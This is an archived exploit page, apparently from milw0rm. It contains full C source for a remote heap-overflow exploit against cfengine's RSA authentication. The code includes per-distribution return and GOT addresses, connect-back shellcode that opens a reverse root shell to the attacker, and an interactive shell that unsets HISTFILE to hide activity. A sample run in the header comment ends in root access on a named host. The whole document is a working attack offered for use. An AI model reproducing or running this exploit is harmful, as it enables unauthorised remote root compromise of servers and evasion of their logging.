<html>
<head>
<title>cfengine RSA RM Heap Overflow Exploit</title>
<pre>
/* removed line 54 /str0ke */

/*           _ ________            _____                        ______
*
* cfengine rsa heap remote exploit  part of PTjob project / \  / &quot;fuck mm&quot;
* by jsk:exworm(http://exworm.hostrocket.com)            \/
* bug found by core
* yep ta mei dayong ..hehe..so pub it..
* my home: www.ph4nt0m.org
* GT: emm.oyxin.seal.ava.haggis.b_root.more..
* No girl No money  No jop...
* bash-2.05b# ./cf_0day -t 1 -h 192.168.31.23
* cfengine rsa heap remote exploit ....s
* --------------------------------------------------(need money.to..fk..girl..)
* [+] lisntener...
* [+] Connected, sending code...
* [+] Ret: 0x0819f03e
* [+] Got: 0x0811a590
* [+] ownedbyOseen!
* -----------------------------------------------------------
* Linux ns2.autson.com 2.4.18-3 #1 Thu Apr 18 07:37:53 EDT 2002 i686 unknown
* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10
*(wheel)
*
*
*/

#include &lt;stdio.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netdb.h&gt;
#include &lt;net/if.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/ioctl.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;getopt.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;errno.h&gt;
#include &lt;linux/sockios.h&gt;

#define BUF 1024

struct {
       char *distro;
       char *type;
       unsigned long ret;
       unsigned long got;

} targets[] = { /*got is free of rsafree() ,get it by yourself to own more machine ;) */
       { &quot;Redhat 7.3 &quot;, &quot;cfengine 2.1.7p1  &quot;,0x0819f03e , 0x0811a590 },
       { &quot;Redhat  7.2  &quot;, &quot;cfengine 2.17p1 &quot;, 0x080d1c78, 0x0806d0e3 },
       { &quot;Redhat 7.1     &quot;, &quot;cfengine 2.17p1&quot;, 0x080d11e0, 0x082bc090 },
       { &quot;Crash          &quot;, &quot;(All platforms)  &quot;, 0x42424242, 0x41414141 },
};
char linux_connect_back[] =  /* connect back 45295 */
&quot;\x31\xc0\x31\xdb\x31\xc9\x51\xb1&quot;
       &quot;\x06\x51\xb1\x01\x51\xb1\x02\x51&quot;
       &quot;\x89\xe1\xb3\x01\xb0\x66\xcd\x80&quot;
       &quot;\x89\xc2\x31\xc0\x31\xc9\x51\x51&quot;
       &quot;\x68\x41\x42\x43\x44\x66\x68\xb0&quot;
       &quot;\xef\xb1\x02\x66\x51\x89\xe7\xb3&quot;
       &quot;\x10\x53\x57\x52\x89\xe1\xb3\x03&quot;
       &quot;\xb0\x66\xcd\x80\x31\xc9\x39\xc1&quot;
       &quot;\x74\x06\x31\xc0\xb0\x01\xcd\x80&quot;
       &quot;\x31\xc0\xb0\x3f\x89\xd3\xcd\x80&quot;
       &quot;\x31\xc0\xb0\x3f\x89\xd3\xb1\x01&quot;
       &quot;\xcd\x80\x31\xc0\xb0\x3f\x89\xd3&quot;
       &quot;\xb1\x02\xcd\x80\x31\xc0\x31\xd2&quot;
       &quot;\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot;
       &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89&quot;
       &quot;\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0&quot;
       &quot;\x01\xcd\x80&quot;;
int sock;
void usage();
void shell();

void
usage(char *prog)
{

        fprintf(stderr,&quot;Usage: %s -t [-pah]\n&quot;,prog);
       fprintf(stderr,&quot;-t version       Linux version.\n&quot;);
       fprintf(stderr,&quot;-h target       The host to attack.\n&quot;);
        fprintf(stderr,&quot;-a password     Default password is \&quot;sorry no password. \&quot;.\n&quot;);
       fprintf(stderr,&quot;-p port         Default port is 5803.\n\n&quot;);
}

int
openhost(char *host,int port)
{
       struct sockaddr_in addr;
       struct hostent *he;

       he=gethostbyname(host);

       if (he==NULL) return -1;
       sock=socket(AF_INET, SOCK_STREAM, getprotobyname(&quot;tcp&quot;)-&gt;p_proto);
       if (sock==-1) return -1;

       memcpy(&amp;addr.sin_addr, he-&gt;h_addr, he-&gt;h_length);

       addr.sin_family=AF_INET;
       addr.sin_port=htons(port);

       if(connect(sock, (struct sockaddr *)&amp;addr, sizeof(addr)) == -1)
       sock=-1;
       return sock;
}

void
shell(int sock)
{
       fd_set  fd_read;
       char buff[1024], *cmd=&quot;unset HISTFILE; /bin/uname -a;/usr/bin/id; echo '*** oseen are chinese...'\n&quot;;
       int n;

       FD_ZERO(&amp;fd_read);
       FD_SET(sock, &amp;fd_read);
       FD_SET(0, &amp;fd_read);

       send(sock, cmd, strlen(cmd), 0);

       while(1) {
               FD_SET(sock, &amp;fd_read);
               FD_SET(0,    &amp;fd_read);

               if (select(sock+1, &amp;fd_read, NULL, NULL, NULL) &lt; 0) break;

               if (FD_ISSET(sock, &amp;fd_read)) {
                       if ((n = recv(sock, buff, sizeof(buff), 0)) &lt; 0){
                               fprintf(stderr, &quot;[+] EOF\n&quot;);
                               exit(2);
                       }

                       if (write(1, buff, n) &lt;0) break;
               }

               if (FD_ISSET(0, &amp;fd_read)) {
                       if ((n = read(0, buff, sizeof(buff))) &lt; 0){
                               fprintf(stderr,&quot;[+] EOF\n&quot;);
                               exit(2);
                       }

                       if (send(sock, buff, n, 0) &lt; 0) break;
               }
       }

       fprintf(stderr,&quot;[+] Connection lost.\n\n&quot;);
       exit(0);
}

unsigned char
*get_my_ip_addr(int sockfd, struct ifreq *ifr)
{
       struct sockaddr_in sin;
       char *b = (char *) malloc(4);

       if (ioctl(sockfd ,SIOCGIFADDR,ifr) &lt; 0) {
               fprintf(stderr, &quot;Unable to get the local IP Address, use -d.\n&quot;);
               exit(1);
       }

       memcpy(&amp;sin, &amp;ifr-&gt;ifr_addr, sizeof(struct sockaddr_in));
       memcpy(b, (char *) &amp;sin.sin_addr.s_addr, 4);
       return b;
}

int
main (int argc,char *argv[])
{
       char buf1[512];
       char buf2[512];
       char host[256];
       char pass[256]=&quot;changeme&quot;;
       char data;

       int  type= 0;
       int c=0;
       int port=8001;
       char device[256] = &quot;eth0&quot;;
       unsigned char *ptr;

       struct hostent *hp;
       struct sockaddr_in sin_listener;
       struct ifreq ifr;
       struct timeval timeout;

       fd_set fdread;

       int delay       = 12;
       int i           = 0;
       int mode        = 0;
       int local_port  = 0;
       int opt         = 0;
       int ret         = 0;
       int sin_len     = sizeof (struct sockaddr_in);
       int sock        = 0;
       int sock2       = 0;
       int sockd       = 0;
       int listener    = 0;
       int time_out    = 4;
       int tmp         = 0;

       srand(getpid());

       fprintf(stdout,&quot;cfengine rsa heap remote exploit ....s\n&quot;);
       fprintf(stdout,&quot;--------------------------------------------------(need money.to..fk..girl..)\n&quot;);

       while((c=getopt(argc,argv,&quot;h:p:a:t:&quot;)) !=EOF)
       {
               switch(c)
               {
                       case 'p':
                               port=atoi(optarg);
                               if ((port &lt;= 0) || (port &gt; 65535)) {
                                       fprintf(stderr,&quot;Invalid port.\n\n&quot;);
                                       exit(1);
                               }
                               break;
                       case 'a':
                               memset(pass,0x0,sizeof(pass));
                               strncpy(pass,optarg,sizeof(pass) - 1);
                               break;
                       case 't':
                               type = atoi(optarg);
                               if (type == 0 || type &gt; sizeof(targets) / 28) {
                                       for(i = 0; i &lt; sizeof(targets) / 28; i++)
                                       fprintf(stderr, &quot;%02d. %s - %s      [0x%08x - 0x%08x]\n&quot;,
                                               i + 1, targets[i].distro, targets[i].type, targets[i].ret, targets[i].got);
                                       return -1;
                               }
                               break;
                       case 'h':
                               memset(host,0x0,sizeof(host));
                               strncpy(host,optarg,sizeof(host) - 1);
                               break;

                       default:
                               usage(argv[0]);
                               exit(1);
                               break;
               }
       }

       timeout.tv_sec = time_out;
       timeout.tv_usec = 0;

       if (strlen(host) == 0) {
               usage(argv[0]);
               exit(1);
       }
       sock=openhost(host, 5308);

       if (sock==-1) {
               fprintf(stderr,&quot;- Unable to connect.\n\n&quot;);
               exit(1);
       }

       strncpy(ifr.ifr_name, device, 15);

       if ((sockd = socket(AF_INET, SOCK_DGRAM, 17)) &lt; 0) {
               fprintf(stderr, &quot;socket() error.\n&quot;);
               return -1;
       }

       if ((listener = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) &lt; 0) {
               fprintf(stderr, &quot;socket() error.\n&quot;);
               return -1;
       }

       ptr = get_my_ip_addr(sockd, &amp;ifr);
      memcpy(&amp;sin_listener.sin_addr.s_addr, ptr, 4);

       sin_listener.sin_family = AF_INET;
       memset(&amp;sin_listener.sin_zero, 0x00, 8);

       while(1) {
               local_port = local_port = 45295;
               sin_listener.sin_port = htons(local_port);
               if (!bind(listener, (struct sockaddr *) &amp;sin_listener, sin_len)) break;
       }

       listen(listener, 1);
       fprintf(stdout, &quot;[+] lisntener...\n&quot;);
       linux_connect_back[33] = (unsigned int) *(ptr + 0);
       linux_connect_back[34] = (unsigned int) *(ptr + 1);
       linux_connect_back[35] = (unsigned int) *(ptr + 2);
       linux_connect_back[36] = (unsigned int) *(ptr + 3);

       memset(buf2,  0x0, sizeof(buf2));
       memset(buf1, 0x90, sizeof(buf1));

       for(i=0;i &lt; strlen(linux_connect_back); i++) buf1[i+50] = linux_connect_back[i];

       buf1[0] = (0x41414141 &amp; 0x000000ff);
       buf1[1] = (0x41414141 &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[2] = (0x41414141 &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[3] = (0x41414141 &amp; 0xff000000) &gt;&gt; 24;

       buf1[4] = (0x58585858 &amp; 0x000000ff);
       buf1[5] = (0x58585858 &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[6] = (0x58585858 &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[7] = (0x58585858 &amp; 0xff000000) &gt;&gt; 24;

       buf1[8] = (0xfffffffc &amp; 0x000000ff);
       buf1[9] = (0xfffffffc &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[10] = (0xfffffffc &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[11] = (0xfffffffc &amp; 0xff000000) &gt;&gt; 24;

       buf1[12] = (0xffffffff &amp; 0x000000ff);
       buf1[13] = (0xffffffff &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[14] = (0xffffffff &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[15] = (0xffffffff &amp; 0xff000000) &gt;&gt; 24;

       buf1[16] = (targets[type - 1].got -12 &amp; 0x000000ff);
       buf1[17] = (targets[type - 1].got -12 &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[18] = (targets[type - 1].got -12 &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[19] = (targets[type - 1].got -12 &amp; 0xff000000) &gt;&gt; 24;

       buf1[20] = (targets[type - 1].ret &amp; 0x000000ff);
       buf1[21] = (targets[type - 1].ret &amp; 0x0000ff00) &gt;&gt; 8;
       buf1[22] = (targets[type - 1].ret &amp; 0x00ff0000) &gt;&gt; 16;
       buf1[23] = (targets[type - 1].ret &amp; 0xff000000) &gt;&gt; 24;

     for(i = 0; i &lt; 300 - sizeof(linux_connect_back) -80; i+=2)
     {
       buf1[i + 24] = 0x7f;
       buf1[i + 25] = 0xeb;
     }
     for(; i &lt; 300 - sizeof(linux_connect_back) - 1; i++)
       buf1[i + 24] = 0x90;
     strcpy(buf1 + i + 24, linux_connect_back);
     buf1[i + 24+ sizeof(linux_connect_back) - 1] = '\n';
     buf1[i + 25 + sizeof(linux_connect_back) - 1] = '\0';

        sprintf(buf2,   &quot;k0000023CAUTH HARE KRISHNA HAREk0003000SAUTH n00000010 00001000%s\r\n&quot;, buf1);

       fprintf(stdout, &quot;Connected, sending code...\n&quot;);
       fprintf(stdout, &quot;[+] Ret: 0x%08x\n&quot;, targets[type - 1].ret);
       fprintf(stdout, &quot;[+] Got: 0x%08x\n&quot;, targets[type - 1].got);
while(1) {
               write(sock, buf2, strlen(buf2));
               close(sock);
               sleep(2);
               FD_ZERO(&amp;fdread);
               FD_SET(listener, &amp;fdread);

               timeout.tv_sec = time_out;
               timeout.tv_usec = 0;

               while(1) {

                       ret = select(FD_SETSIZE, &amp;fdread, NULL, NULL, &amp;timeout);

                       if (ret &lt; 0) {
                               close(sock);
                               close(listener);
                               fprintf(stderr, &quot;select() error.\n&quot;);
                               return -1;
                       }

                       if (ret == 0) {
                               fprintf(stderr, &quot;[+] Failed, waiting %d seconds.\n&quot;
                                               &quot;[+] Use ctrl-c to abort.\n&quot;, delay);
                               sleep(delay);
                               break;
                       }

                       if(FD_ISSET(listener, &amp;fdread)) {
                               sock2 = accept(listener, (struct sockaddr *)&amp;sin_listener, &amp;sin_len);
                               close(sock);
                               close(listener);

                               fprintf(stderr, &quot;[+] ownedbyOseen!\n&quot;
                                               &quot;-----------------------------------------------------------\n&quot;);
                               shell(sock2);
                               close(sock2);
                               return 0;
                       }
               }

       }

       fprintf(stderr, &quot;[+] Exploit failed.\n&quot;);
       close(listener);
       close(sock);
       return 0;

}</pre>
// milw0rm.com [2005-02-20]
</html>

